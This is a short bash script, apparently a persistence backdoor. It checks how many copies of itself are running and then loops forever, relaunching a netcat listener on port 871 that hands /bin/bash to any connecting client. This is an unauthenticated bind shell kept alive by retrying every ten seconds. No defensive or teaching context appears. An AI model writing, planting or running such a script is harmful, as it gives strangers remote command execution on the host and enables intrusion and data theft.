#!/bin/bash

dupe_script=$(ps -ef | grep "tacnwd.sh" | grep -v grep | wc -l)

if [ ${dupe_script} -gt 3 ]; then
    exit 0
fi

while true; do
  until nc -nvlp 871 -e /bin/bash; do
    sleep 10
  done
done
